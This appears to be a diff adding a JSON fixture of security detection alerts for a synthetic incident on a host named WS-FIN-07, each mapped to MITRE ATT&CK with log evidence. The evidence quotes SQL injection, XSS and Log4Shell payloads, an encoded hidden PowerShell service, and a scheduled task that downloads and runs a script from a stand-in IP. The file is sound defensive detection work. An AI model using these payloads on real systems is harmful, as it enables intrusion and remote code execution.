@@ -1,0 +1,504 @@
+[
+  {
+    "ruleId": "LS-AUTH-003",
+    "title": "Possible account compromise: \u0027Administrator\u0027",
+    "severity": "Critical",
+    "technique": {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1078/"
+    },
+    "description": "203.0.113.80 logged in successfully as \u0027Administrator\u0027 after 40 failed attempts. Verify with the account owner, reset credentials and review the session.",
+    "sourceIp": "203.0.113.80",
+    "user": "Administrator",
+    "host": "WS-FIN-07",
+    "firstSeen": "2026-10-31T08:20:03+00:00",
+    "lastSeen": "2026-10-31T08:22:30+00:00",
+    "eventCount": 41,
+    "evidence": [
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:20:03.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4625,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022,\u0022WorkstationName\u0022:\u0022kali\u0022}}}",
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:20:06.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4625,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022,\u0022WorkstationName\u0022:\u0022kali\u0022}}}",
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:20:09.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4625,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022,\u0022WorkstationName\u0022:\u0022kali\u0022}}}",
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:22:30.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4624,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022}}}"
+    ]
+  },
+  {
+    "ruleId": "LS-WIN-002",
+    "title": "New account \u0027support_tmp\u0027 created and made member of Administrators",
+    "severity": "Critical",
+    "technique": {
+      "id": "T1136.001",
+      "name": "Create Account: Local Account",
+      "tactic": "Persistence",
+      "url": "https://attack.mitre.org/techniques/T1136/001/"
+    },
+    "description": "\u0027Administrator\u0027 created the account \u0027support_tmp\u0027 and added it to \u0027Administrators\u0027 1 minute later. Typical backdoor-admin pattern after a compromise: disable the account and investigate the actor.",
+    "sourceIp": null,
+    "user": "support_tmp",
+    "host": "WS-FIN-07",
+    "firstSeen": "2026-10-31T08:27:30+00:00",
+    "lastSeen": "2026-10-31T08:28:30+00:00",
+    "eventCount": 2,
+    "evidence": [
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:27:30.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4720,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022support_tmp\u0022,\u0022SubjectUserName\u0022:\u0022Administrator\u0022}}}",
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:28:30.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4732,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022MemberName\u0022:\u0022CN=support_tmp,CN=Users,DC=corp,DC=local\u0022,\u0022TargetUserName\u0022:\u0022Administrators\u0022,\u0022SubjectUserName\u0022:\u0022Administrator\u0022}}}"
+    ]
+  },
+  {
+    "ruleId": "LS-AUTH-003",
+    "title": "Possible account compromise: \u0027backup@example.de\u0027",
+    "severity": "Critical",
+    "technique": {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1078/"
+    },
+    "description": "198.51.100.23 logged in successfully as \u0027backup@example.de\u0027 after 12 failed attempts. Verify with the account owner, reset credentials and review the session.",
+    "sourceIp": "198.51.100.23",
+    "user": "backup@example.de",
+    "host": null,
+    "firstSeen": "2026-10-31T09:05:38+00:00",
+    "lastSeen": "2026-10-31T09:13:53+00:00",
+    "eventCount": 13,
+    "evidence": [
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:05:38.0000000Z\u0022,\u0022type\u0022:\u0022login.failed\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022admin@example.de\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:\u0022bad-password\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:06:23.0000000Z\u0022,\u0022type\u0022:\u0022login.failed\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022info@example.de\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:\u0022bad-password\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:06:48.0000000Z\u0022,\u0022type\u0022:\u0022login.failed\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022lena@example.de\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:\u0022bad-password\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:13:53.0000000Z\u0022,\u0022type\u0022:\u0022login.success\u0022,\u0022success\u0022:true,\u0022email\u0022:\u0022backup@example.de\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:null}"
+    ]
+  },
+  {
+    "ruleId": "LS-WEB-002",
+    "title": "Sensitive files exposed to a scanner",
+    "severity": "Critical",
+    "technique": {
+      "id": "T1595.002",
+      "name": "Active Scanning: Vulnerability Scanning",
+      "tactic": "Reconnaissance",
+      "url": "https://attack.mitre.org/techniques/T1595/002/"
+    },
+    "description": "203.0.113.45 requested 5 sensitive paths (/.git/config, /.env, /wp-login.php, /phpmyadmin/, /backup.sql). Served with HTTP 2xx: /.env. Remove these files immediately.",
+    "sourceIp": "203.0.113.45",
+    "user": null,
+    "host": null,
+    "firstSeen": "2026-10-31T10:00:39+00:00",
+    "lastSeen": "2026-10-31T10:00:40+00:00",
+    "eventCount": 5,
+    "evidence": [
+      "203.0.113.45 - - [31/Oct/2026:10:00:39 \u002B0000] \u0022GET /.git/config HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:40 \u002B0000] \u0022GET /.env HTTP/1.1\u0022 200 5120 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:40 \u002B0000] \u0022GET /wp-login.php HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:40 \u002B0000] \u0022GET /phpmyadmin/ HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022",
+      "203.0.113.45 - - [31/Oct/2026:10:00:40 \u002B0000] \u0022GET /backup.sql HTTP/1.1\u0022 404 162 \u0022-\u0022 \u0022gobuster/3.6\u0022"
+    ]
+  },
+  {
+    "ruleId": "LS-MAIL-002",
+    "title": "\u0027lena@example.de\u0027 logged in from a new IP after a phishing email",
+    "severity": "Critical",
+    "technique": {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1078/"
+    },
+    "description": "17 min after receiving \u0022Passwort l\u00E4uft heute ab\u0022 (LikelyPhishing), \u0027lena@example.de\u0027 logged in from 192.0.2.77, an address never seen for this account. Treat the password as stolen: reset it, revoke all sessions and tokens, and check MFA devices and mailbox rules.",
+    "sourceIp": "192.0.2.77",
+    "user": "lena@example.de",
+    "host": null,
+    "firstSeen": "2026-10-31T10:02:00+00:00",
+    "lastSeen": "2026-10-31T10:19:00+00:00",
+    "eventCount": 2,
+    "evidence": [
+      "{\u0022timestamp\u0022:\u00222026-10-31T10:02:00Z\u0022,\u0022source\u0022:\u0022phishlens\u0022,\u0022type\u0022:\u0022email.analyzed\u0022,\u0022verdict\u0022:\u0022LikelyPhishing\u0022,\u0022score\u0022:0,\u0022recipient\u0022:\u0022lena@example.de\u0022,\u0022sender\u0022:\u0022it-service@examp1e-bank.example\u0022,\u0022subject\u0022:\u0022Passwort l\\u00E4uft heute ab\u0022,\u0022originIp\u0022:\u0022198.51.100.140\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T10:19:00.0000000Z\u0022,\u0022type\u0022:\u0022login.success\u0022,\u0022success\u0022:true,\u0022email\u0022:\u0022lena@example.de\u0022,\u0022ipAddress\u0022:\u0022192.0.2.77\u0022,\u0022detail\u0022:null}"
+    ]
+  },
+  {
+    "ruleId": "LS-WEB-001",
+    "title": "SQL injection attempts",
+    "severity": "Critical",
+    "technique": {
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    "description": "24 request(s) from 192.0.2.150 contained SQL injection payloads. 1 were answered with HTTP 2xx: check whether the payload was executed.",
+    "sourceIp": "192.0.2.150",
+    "user": null,
+    "host": null,
+    "firstSeen": "2026-10-31T11:12:01+00:00",
+    "lastSeen": "2026-10-31T11:12:38+00:00",
+    "eventCount": 24,
+    "evidence": [
+      "192.0.2.150 - - [31/Oct/2026:11:12:01 \u002B0000] \u0022GET /products?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\u0022 500 162 \u0022-\u0022 \u0022sqlmap/1.8.4#stable (https://sqlmap.org)\u0022",
+      "192.0.2.150 - - [31/Oct/2026:11:12:02 \u002B0000] \u0022GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\u0022 403 162 \u0022-\u0022 \u0022sqlmap/1.8.4#stable (https://sqlmap.org)\u0022",
+      "192.0.2.150 - - [31/Oct/2026:11:12:04 \u002B0000] \u0022GET /products?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1\u0022 403 162 \u0022-\u0022 \u0022sqlmap/1.8.4#stable (https://sqlmap.org)\u0022",
+      "192.0.2.150 - - [31/Oct/2026:11:12:06 \u002B0000] \u0022GET /products?id=1;%20DROP%20TABLE%20users HTTP/1.1\u0022 500 162 \u0022-\u0022 \u0022sqlmap/1.8.4#stable (https://sqlmap.org)\u0022",
+      "192.0.2.150 - - [31/Oct/2026:11:12:08 \u002B0000] \u0022GET /search?q=%27%20OR%201%3D1-- HTTP/1.1\u0022 403 162 \u0022-\u0022 \u0022sqlmap/1.8.4#stable (https://sqlmap.org)\u0022"
+    ]
+  },
+  {
+    "ruleId": "LS-MAIL-002",
+    "title": "\u0027maria@example.com\u0027 logged in from a new IP after a phishing email",
+    "severity": "Critical",
+    "technique": {
+      "id": "T1078",
+      "name": "Valid Accounts",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1078/"
+    },
+    "description": "26 min after receiving \u0022Unusual sign-in: verify your account\u0022 (Malicious), \u0027maria@example.com\u0027 logged in from 192.0.2.99, an address never seen for this account. Treat the password as stolen: reset it, revoke all sessions and tokens, and check MFA devices and mailbox rules.",
+    "sourceIp": "192.0.2.99",
+    "user": "maria@example.com",
+    "host": null,
+    "firstSeen": "2026-10-31T12:05:00+00:00",
+    "lastSeen": "2026-10-31T12:31:00+00:00",
+    "eventCount": 2,
+    "evidence": [
+      "{\u0022timestamp\u0022:\u00222026-10-31T12:05:00Z\u0022,\u0022source\u0022:\u0022phishlens\u0022,\u0022type\u0022:\u0022email.analyzed\u0022,\u0022verdict\u0022:\u0022Malicious\u0022,\u0022score\u0022:100,\u0022recipient\u0022:\u0022maria@example.com\u0022,\u0022sender\u0022:\u0022security@rnicrosoft-support.example\u0022,\u0022subject\u0022:\u0022Unusual sign-in: verify your account\u0022,\u0022originIp\u0022:\u0022203.0.113.120\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T12:31:00.0000000Z\u0022,\u0022type\u0022:\u0022login.success\u0022,\u0022success\u0022:true,\u0022email\u0022:\u0022maria@example.com\u0022,\u0022ipAddress\u0022:\u0022192.0.2.99\u0022,\u0022detail\u0022:null}"
+    ]
+  },
+  {
+    "ruleId": "LS-WEB-001",
+    "title": "Log4Shell (JNDI injection) attempts",
+    "severity": "Critical",
+    "technique": {
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    "description": "1 request(s) from 192.0.2.201 contained Log4Shell (JNDI injection) payloads. 1 were answered with HTTP 2xx: check whether the payload was executed.",
+    "sourceIp": "192.0.2.201",
+    "user": null,
+    "host": null,
+    "firstSeen": "2026-10-31T12:30:00+00:00",
+    "lastSeen": "2026-10-31T12:30:00+00:00",
+    "eventCount": 1,
+    "evidence": [
+      "192.0.2.201 - - [31/Oct/2026:12:30:00 \u002B0000] \u0022GET / HTTP/1.1\u0022 200 5120 \u0022-\u0022 \u0022${jndi:ldap://192.0.2.201:1389/Exploit}\u0022"
+    ]
+  },
+  {
+    "ruleId": "LS-AUTH-001",
+    "title": "Brute force against \u0027root\u0027 via Ssh",
+    "severity": "High",
+    "technique": {
+      "id": "T1110.001",
+      "name": "Brute Force: Password Guessing",
+      "tactic": "Credential Access",
+      "url": "https://attack.mitre.org/techniques/T1110/001/"
+    },
+    "description": "72 failed logins for \u0027root\u0027 from 203.0.113.66 within 2.8 min.",
+    "sourceIp": "203.0.113.66",
+    "user": "root",
+    "host": null,
+    "firstSeen": "2026-10-31T07:47:03+00:00",
+    "lastSeen": "2026-10-31T07:49:50+00:00",
+    "eventCount": 72,
+    "evidence": [
+      "2026-10-31T07:47:03.000\u002B00:00 web01 sshd[22428]: Failed password for root from 203.0.113.66 port 46699 ssh2",
+      "2026-10-31T07:47:04.000\u002B00:00 web01 sshd[11000]: Failed password for root from 203.0.113.66 port 42914 ssh2",
+      "2026-10-31T07:47:07.000\u002B00:00 web01 sshd[66714]: Failed password for root from 203.0.113.66 port 52342 ssh2",
+      "2026-10-31T07:47:10.000\u002B00:00 web01 sshd[32428]: Failed password for root from 203.0.113.66 port 44067 ssh2",
+      "2026-10-31T07:47:11.000\u002B00:00 web01 sshd[21000]: Failed password for root from 203.0.113.66 port 48179 ssh2"
+    ]
+  },
+  {
+    "ruleId": "LS-WIN-003",
+    "title": "Suspicious service \u0027WinUpdateHelper\u0027 installed on WS-FIN-07",
+    "severity": "High",
+    "technique": {
+      "id": "T1543.003",
+      "name": "Create or Modify System Process: Windows Service",
+      "tactic": "Persistence",
+      "url": "https://attack.mitre.org/techniques/T1543/003/"
+    },
+    "description": "A service was installed whose command line looks malicious: %COMSPEC% /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA. Legitimate software rarely starts services through encoded PowerShell, cmd /c or user-writable folders.",
+    "sourceIp": null,
+    "user": null,
+    "host": "WS-FIN-07",
+    "firstSeen": "2026-10-31T08:31:30+00:00",
+    "lastSeen": "2026-10-31T08:31:30+00:00",
+    "eventCount": 1,
+    "evidence": [
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:31:30.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022System\u0022,\u0022event_id\u0022:7045,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022ServiceName\u0022:\u0022WinUpdateHelper\u0022,\u0022ImagePath\u0022:\u0022%COMSPEC% /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\u0022,\u0022AccountName\u0022:\u0022LocalSystem\u0022}}}"
+    ]
+  },
+  {
+    "ruleId": "LS-WIN-004",
+    "title": "Suspicious scheduled task \u0027\\Microsoft\\Windows\\UpdateCheck\u0027 on WS-FIN-07",
+    "severity": "High",
+    "technique": {
+      "id": "T1053.005",
+      "name": "Scheduled Task/Job: Scheduled Task",
+      "tactic": "Persistence",
+      "url": "https://attack.mitre.org/techniques/T1053/005/"
+    },
+    "description": "\u0027support_tmp\u0027 created a scheduled task that runs a suspicious command: \u003CExec\u003E\u003CCommand\u003Epowershell.exe\u003C/Command\u003E\u003CArguments\u003E-w hidden -c IEX (New-Object Net.WebClient).DownloadString(\u0027http://203.0.113.80/a.ps1\u0027)\u003C/Arguments\u003E\u003C/Exec\u003E.",
+    "sourceIp": null,
+    "user": "support_tmp",
+    "host": "WS-FIN-07",
+    "firstSeen": "2026-10-31T08:33:30+00:00",
+    "lastSeen": "2026-10-31T08:33:30+00:00",
+    "eventCount": 1,
+    "evidence": [
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:33:30.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4698,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TaskName\u0022:\u0022\\\\Microsoft\\\\Windows\\\\UpdateCheck\u0022,\u0022TaskContent\u0022:\u0022\\u003CExec\\u003E\\u003CCommand\\u003Epowershell.exe\\u003C/Command\\u003E\\u003CArguments\\u003E-w hidden -c IEX (New-Object Net.WebClient).DownloadString(\\u0027http://203.0.113.80/a.ps1\\u0027)\\u003C/Arguments\\u003E\\u003C/Exec\\u003E\u0022,\u0022SubjectUserName\u0022:\u0022support_tmp\u0022}}}"
+    ]
+  },
+  {
+    "ruleId": "LS-WIN-001",
+    "title": "Security log cleared on WS-FIN-07",
+    "severity": "High",
+    "technique": {
+      "id": "T1070.001",
+      "name": "Indicator Removal: Clear Windows Event Logs",
+      "tactic": "Defense Evasion",
+      "url": "https://attack.mitre.org/techniques/T1070/001/"
+    },
+    "description": "\u0027support_tmp\u0027 cleared the Windows Security log. Clearing logs is a classic step to hide an intrusion. Check what happened on this host just before, and collect logs from other sources (EDR, network).",
+    "sourceIp": null,
+    "user": "support_tmp",
+    "host": "WS-FIN-07",
+    "firstSeen": "2026-10-31T08:36:30+00:00",
+    "lastSeen": "2026-10-31T08:36:30+00:00",
+    "eventCount": 1,
+    "evidence": [
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:36:30.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:1102,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022user_data\u0022:{\u0022SubjectUserName\u0022:\u0022support_tmp\u0022}}}"
+    ]
+  },
+  {
+    "ruleId": "LS-AUTH-002",
+    "title": "Password spraying across 12 accounts",
+    "severity": "High",
+    "technique": {
+      "id": "T1110.003",
+      "name": "Brute Force: Password Spraying",
+      "tactic": "Credential Access",
+      "url": "https://attack.mitre.org/techniques/T1110/003/"
+    },
+    "description": "198.51.100.23 failed to log in as 12 different users (admin@example.de, info@example.de, lena@example.de, jonas@example.de, sofia@example.com, max@example.org, support@example.de, hr@example.de, \u2026).",
+    "sourceIp": "198.51.100.23",
+    "user": null,
+    "host": null,
+    "firstSeen": "2026-10-31T09:05:38+00:00",
+    "lastSeen": "2026-10-31T09:13:08+00:00",
+    "eventCount": 12,
+    "evidence": [
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:05:38.0000000Z\u0022,\u0022type\u0022:\u0022login.failed\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022admin@example.de\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:\u0022bad-password\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:06:23.0000000Z\u0022,\u0022type\u0022:\u0022login.failed\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022info@example.de\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:\u0022bad-password\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:06:48.0000000Z\u0022,\u0022type\u0022:\u0022login.failed\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022lena@example.de\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:\u0022bad-password\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:07:21.0000000Z\u0022,\u0022type\u0022:\u0022login.failed\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022jonas@example.de\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:\u0022bad-password\u0022}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T09:08:13.0000000Z\u0022,\u0022type\u0022:\u0022login.failed\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022sofia@example.com\u0022,\u0022ipAddress\u0022:\u0022198.51.100.23\u0022,\u0022detail\u0022:\u0022bad-password\u0022}"
+    ]
+  },
+  {
+    "ruleId": "LS-FIN-001",
+    "title": "lena@example.de tried 2 times to approve their own payments",
+    "severity": "High",
+    "technique": {
+      "id": "T1657",
+      "name": "Financial Theft",
+      "tactic": "Impact",
+      "url": "https://attack.mitre.org/techniques/T1657/"
+    },
+    "description": "Kontor refused 2 self-approval attempt(s) on 1 payment(s) (payment.self_approval_denied 9850.00 EUR: You entered this payment yourself.). Check with the payment owner whether the transfers are genuine, hold them, and review the account\u0027s recent logins: an attacker with a clerk\u0027s password would try exactly this.",
+    "sourceIp": null,
+    "user": "lena@example.de",
+    "host": null,
+    "firstSeen": "2026-10-31T10:23:00+00:00",
+    "lastSeen": "2026-10-31T10:25:00+00:00",
+    "eventCount": 2,
+    "evidence": [
+      "{\u0022timestamp\u0022:\u00222026-10-31T10:23:00.000Z\u0022,\u0022source\u0022:\u0022kontor\u0022,\u0022sequence\u0022:42,\u0022actor\u0022:\u0022lena@example.de\u0022,\u0022action\u0022:\u0022payment.self_approval_denied\u0022,\u0022subject\u0022:\u002200000000-0000-0000-0000-000000000000\u0022,\u0022details\u0022:{\u0022amount\u0022:9850.00,\u0022reason\u0022:\u0022You entered this payment yourself.\u0022,\u0022endToEndId\u0022:\u0022KON-20261110-4F1A9C2B7E01\u0022}}",
+      "{\u0022timestamp\u0022:\u00222026-10-31T10:25:00.000Z\u0022,\u0022source\u0022:\u0022kontor\u0022,\u0022sequence\u0022:43,\u0022actor\u0022:\u0022lena@example.de\u0022,\u0022action\u0022:\u0022payment.self_approval_denied\u0022,\u0022subject\u0022:\u002200000000-0000-0000-0000-000000000000\u0022,\u0022details\u0022:{\u0022amount\u0022:9850.00,\u0022reason\u0022:\u0022You entered this payment yourself.\u0022,\u0022endToEndId\u0022:\u0022KON-20261110-4F1A9C2B7E01\u0022}}"
+    ]
+  },
+  {
+    "ruleId": "LS-WEB-001",
+    "title": "Cross-site scripting attempts",
+    "severity": "High",
+    "technique": {
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    "description": "3 request(s) from 198.51.100.77 contained Cross-site scripting payloads. All were rejected by the application.",
+    "sourceIp": "198.51.100.77",
+    "user": null,
+    "host": null,
+    "firstSeen": "2026-10-31T12:00:12+00:00",
+    "lastSeen": "2026-10-31T12:00:40+00:00",
+    "eventCount": 3,
+    "evidence": [
+      "198.51.100.77 - - [31/Oct/2026:12:00:12 \u002B0000] \u0022GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\u0022 400 162 \u0022-\u0022 \u0022Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\u0022",
+      "198.51.100.77 - - [31/Oct/2026:12:00:21 \u002B0000] \u0022GET /search?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1\u0022 400 162 \u0022-\u0022 \u0022Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\u0022",
+      "198.51.100.77 - - [31/Oct/2026:12:00:40 \u002B0000] \u0022GET /contact?name=javascript:alert(document.cookie) HTTP/1.1\u0022 400 162 \u0022-\u0022 \u0022Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\u0022"
+    ]
+  },
+  {
+    "ruleId": "LS-MAIL-001",
+    "title": "Phishing delivered to maria@example.com",
+    "severity": "High",
+    "technique": {
+      "id": "T1566",
+      "name": "Phishing",
+      "tactic": "Initial Access",
+      "url": "https://attack.mitre.org/techniques/T1566/"
+    },
+    "description": "PhishLens judged \u0022Unusual sign-in: verify your account\u0022 from security@rnicrosoft-support.example as Malicious. Find the other recipients, remove the message, block the indicators, and check whether anyone clicked.",
+    "sourceIp": "203.0.113.120",
+    "user": "maria@example.com",
+    "host": null,
+    "firstSeen": "2026-10-31T12:05:00+00:00",
+    "lastSeen": "2026-10-31T12:05:00+00:00",
+    "eventCount": 1,
+    "evidence": [
+      "{\u0022timestamp\u0022:\u00222026-10-31T12:05:00Z\u0022,\u0022source\u0022:\u0022phishlens\u0022,\u0022type\u0022:\u0022email.analyzed\u0022,\u0022verdict\u0022:\u0022Malicious\u0022,\u0022score\u0022:100,\u0022recipient\u0022:\u0022maria@example.com\u0022,\u0022sender\u0022:\u0022security@rnicrosoft-support.example\u0022,\u0022subject\u0022:\u0022Unusual sign-in: verify your account\u0022,\u0022originIp\u0022:\u0022203.0.113.120\u0022}"
+    ]
+  },
+  {
+    "ruleId": "LS-AUTH-004",
+    "title": "Stolen session token suspected for \u0027maria@example.com\u0027",
+    "severity": "High",
+    "technique": {
+      "id": "T1550.001",
+      "name": "Use Alternate Authentication Material: Application Access Token",
+      "tactic": "Defense Evasion",
+      "url": "https://attack.mitre.org/techniques/T1550/001/"
+    },
+    "description": "A refresh token was used after it had already been rotated. The session family was revoked automatically. Check the user\u0027s devices for malware or token theft.",
+    "sourceIp": "192.0.2.99",
+    "user": "maria@example.com",
+    "host": null,
+    "firstSeen": "2026-10-31T12:41:00+00:00",
+    "lastSeen": "2026-10-31T12:41:00+00:00",
+    "eventCount": 1,
+    "evidence": [
+      "{\u0022timestamp\u0022:\u00222026-10-31T12:41:00.0000000Z\u0022,\u0022type\u0022:\u0022token.reuse-detected\u0022,\u0022success\u0022:false,\u0022email\u0022:\u0022maria@example.com\u0022,\u0022ipAddress\u0022:\u0022192.0.2.99\u0022,\u0022detail\u0022:\u0022family=7f3c2a10-1b2c-4d5e-8f90-123456789abc\u0022}"
+    ]
+  },
+  {
+    "ruleId": "LS-AUTH-001",
+    "title": "Brute force against \u0027Administrator\u0027 via Windows",
+    "severity": "Medium",
+    "technique": {
+      "id": "T1110.001",
+      "name": "Brute Force: Password Guessing",
+      "tactic": "Credential Access",
+      "url": "https://attack.mitre.org/techniques/T1110/001/"
+    },
+    "description": "40 failed logins for \u0027Administrator\u0027 from 203.0.113.80 within 2.1 min.",
+    "sourceIp": "203.0.113.80",
+    "user": "Administrator",
+    "host": "WS-FIN-07",
+    "firstSeen": "2026-10-31T08:20:03+00:00",
+    "lastSeen": "2026-10-31T08:22:10+00:00",
+    "eventCount": 40,
+    "evidence": [
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:20:03.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4625,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022,\u0022WorkstationName\u0022:\u0022kali\u0022}}}",
+      "{\u0022@timestamp\u0022:\u00222026-10-31T08:20:06.000Z\u0022,\u0022host\u0022:{\u0022name\u0022:\u0022WS-FIN-07\u0022},\u0022winlog\u0022:{\u0022channel\u0022:\u0022Security\u0022,\u0022event_id\u0022:4625,\u0022computer_name\u0022:\u0022WS-FIN-07\u0022,\u0022event_data\u0022:{\u0022TargetUserName\u0022:\u0022Administrator\u0022,\u0022IpAddress\u0022:\u0022203.0.113.80\u0022,\u0022LogonType\u0022:\u002210\u0022,\u0022WorkstationName\u0022:\u0022kali\u0022}}}",
